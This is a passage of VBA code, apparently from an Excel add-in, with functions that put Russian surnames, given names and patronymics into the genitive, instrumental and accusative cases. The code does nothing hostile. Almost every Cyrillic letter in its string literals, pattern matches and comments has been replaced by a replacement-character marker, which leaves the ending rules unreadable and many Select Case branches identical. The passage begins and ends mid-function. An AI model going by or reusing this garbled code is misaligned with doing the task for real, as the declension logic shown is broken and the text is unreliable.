    If Len(sSurname) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        arrSurname = Split(sSurname, "-")
        For i = LBound(arrSurname) To UBound(arrSurname)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            sRes = "": sSurnamePart = arrSurname(i)

            If bMaleSex Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case Else: sRes = sSurnamePart & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|][!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = sSurnamePart & "|fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart
                    Case "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                        If Len(sSurnamePart) <= 4 Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If Right(sSurnamePart, 3) = "|fffd||fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"    ' upd 04.01.2016
                End Select

            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
                         "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd|"
                    Case Else: sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                End Select

            End If

            ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd|" Then sRes = sSurnamePart

            arrSurname(i) = sRes
        Next
        GenitiveCase = Join(arrSurname, "-") & " "        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    End If

    If Len(sName) > 0 Then        '   |fffd||fffd||fffd|
        NameException$ = GetGenitiveException(sName)
        If Len(NameException$) Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            GenitiveCase = GenitiveCase & NameException$
        Else        ' |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If bMaleSex Then
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|": GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|", "|fffd|", ".": GenitiveCase = GenitiveCase & sName
                    Case Else: GenitiveCase = GenitiveCase & sName & "|fffd|"
                End Select
            Else
                Select Case Right(sName, 1)
                    Case "|fffd|"
                        Select Case Right(sName, 2)
                            Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|"
                                GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                            Case Else
                                GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                        End Select
                    Case "|fffd|": GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case Else: GenitiveCase = GenitiveCase & sName
                End Select
            End If
        End If
        GenitiveCase = GenitiveCase & " "
    End If

    If Len(sPatronymic) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Then
            GenitiveCase = GenitiveCase & sPatronymic
        Else
            If bMaleSex Then
                GenitiveCase = GenitiveCase & sPatronymic & "|fffd|"
            Else
                GenitiveCase = GenitiveCase & Mid(sPatronymic, 1, Len(sPatronymic) - 1) & "|fffd|"
            End If
        End If
    End If
    GenitiveCase = Replace(GenitiveCase, "-", "- ")
    GenitiveCase = StrConv(GenitiveCase, vbUnicode + vbProperCase)
    GenitiveCase = Trim(Replace(GenitiveCase, "- ", "-"))
End Function

Function GetGenitiveException(ByVal txt$) As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Select Case txt$
        Case "|fffd||fffd||fffd||fffd||fffd|": GetGenitiveException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd|": GetGenitiveException = "|fffd||fffd||fffd||fffd|"
        Case "|3f8||fffd||fffd|": GetGenitiveException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd||fffd||fffd||fffd|": GetGenitiveException = "|fffd||fffd||fffd||fffd||fffd||fffd|"

            ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            ' Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|": GetGenitiveException = txt$
    End Select
End Function

Function InstrumentalCase(sSurname$, Optional sName$, Optional sPatronymic$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: sSurname - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, sName - |fffd||fffd||fffd|, sPatronymic - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2015 EducatedFool

    Application.Volatile True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sSurname$ = Replace(sSurname$, " - ", "-"): sSurname$ = Replace(Replace(sSurname$, " -", "-"), "- ", "-")

    On Error Resume Next
    If sName$ = "" And sPatronymic$ = "" Then
        arr = Split(Application.Trim(sSurname$))
        sSurname$ = arr(0): sName$ = arr(1): sPatronymic$ = Replace(arr(2), ".", "")
    End If

    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| "|fffd||fffd||fffd|" |fffd||fffd||fffd| "|fffd||fffd||fffd||fffd|" - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
    Dim bMaleSex As Boolean:    ' bMaleSex = (Right(sPatronymic, 1) = "|fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")
    bMaleSex = Not (Right(sPatronymic, 2) = "|fffd||fffd|" Or Right(sPatronymic, 3) = "|fffd||fffd||fffd|")

    If Len(sSurname) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        arrSurname = Split(sSurname, "-")
        For i = LBound(arrSurname) To UBound(arrSurname)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            sRes = "": sSurnamePart = arrSurname(i)

            If bMaleSex Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", ChrW(1110): sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart & "|fffd||fffd|"
                    Case "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart & "|fffd||fffd|"
                    Case Else: sRes = sSurnamePart & "|fffd||fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[|fffd|]|fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart & "|fffd||fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart & "|fffd||fffd|"
                End Select

            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
                         "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case Else: sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    '
                End Select

            End If

            ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd|" Then sRes = sSurnamePart

            arrSurname(i) = sRes
        Next
        InstrumentalCase = Join(arrSurname, "-") & " "        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    End If

    If Len(sName) > 0 Then        '   |fffd||fffd||fffd|
        NameException$ = GetInstrumentalException(sName)
        If Len(NameException$) Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            InstrumentalCase = InstrumentalCase & NameException$
        Else        ' |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If bMaleSex Then
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", ".": InstrumentalCase = InstrumentalCase & sName
                    Case Else: InstrumentalCase = InstrumentalCase & sName & "|fffd||fffd|"
                End Select
            Else
                Select Case Right(sName, 1)
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case Else: InstrumentalCase = InstrumentalCase & sName
                End Select
            End If
        End If
        InstrumentalCase = InstrumentalCase & " "
    End If

    If Len(sPatronymic) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Right(sPatronymic, 3) = ChrW(1201) & "|fffd||fffd|" Or Right(sPatronymic, 4) = ChrW(1179) & "|fffd||fffd||fffd|" _
           Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Then
            InstrumentalCase = InstrumentalCase & sPatronymic
        Else
            If bMaleSex Then
                Select Case Right(sPatronymic, 3)
                    Case "|fffd||fffd||fffd|"
                        InstrumentalCase = InstrumentalCase & sPatronymic & "|fffd||fffd|"
                    Case Else
                        InstrumentalCase = InstrumentalCase & sPatronymic & "|fffd||fffd|"
                End Select
            Else
                InstrumentalCase = InstrumentalCase & Mid(sPatronymic, 1, Len(sPatronymic) - 1) & "|fffd||fffd|"
            End If
        End If
    End If
    InstrumentalCase = Replace(InstrumentalCase, "-", "- ")
    InstrumentalCase = StrConv(InstrumentalCase, vbUnicode + vbProperCase)
    InstrumentalCase = Replace(InstrumentalCase, "- ", "-")
End Function

Function GetInstrumentalException(ByVal txt$) As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Select Case txt$
        Case "|fffd||fffd||fffd||fffd||fffd|": GetInstrumentalException = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd|": GetInstrumentalException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|3f8||fffd||fffd|": GetInstrumentalException = "|fffd||fffd||fffd||fffd||fffd||fffd|"

            ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|": GetInstrumentalException = txt$
    End Select
End Function

Function AccusativeCase(sSurname$, Optional sName$, Optional sPatronymic$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: sSurname - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, sName - |fffd||fffd||fffd|, sPatronymic - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2013 EducatedFool

    Application.Volatile True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sSurname$ = Replace(sSurname$, " - ", "-"): sSurname$ = Replace(Replace(sSurname$, " -", "-"), "- ", "-")

    On Error Resume Next
    If sName$ = "" And sPatronymic$ = "" Then
        arr = Split(Application.Trim(sSurname$))
        sSurname$ = arr(0): sName$ = arr(1): sPatronymic$ = Replace(arr(2), ".", "")
    End If

    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| "|fffd||fffd||fffd|" |fffd||fffd||fffd| "|fffd||fffd||fffd||fffd|" - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
    Dim bMaleSex As Boolean:    ' bMaleSex = (Right(sPatronymic, 1) = "|fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")
    bMaleSex = Not (Right(sPatronymic, 2) = "|fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")

    If Len(sSurname) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        arrSurname = Split(sSurname, "-")
        For i = LBound(arrSurname) To UBound(arrSurname)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            sRes = "": sSurnamePart = arrSurname(i)

            If bMaleSex Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case Else: sRes = sSurnamePart & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|][!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = sSurnamePart & "|fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart
                    Case "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                        If Len(sSurnamePart) <= 4 Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If Right(sSurnamePart, 3) = "|fffd||fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                End Select

            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
                         "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd|"
                    Case Else: sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                End Select

            End If

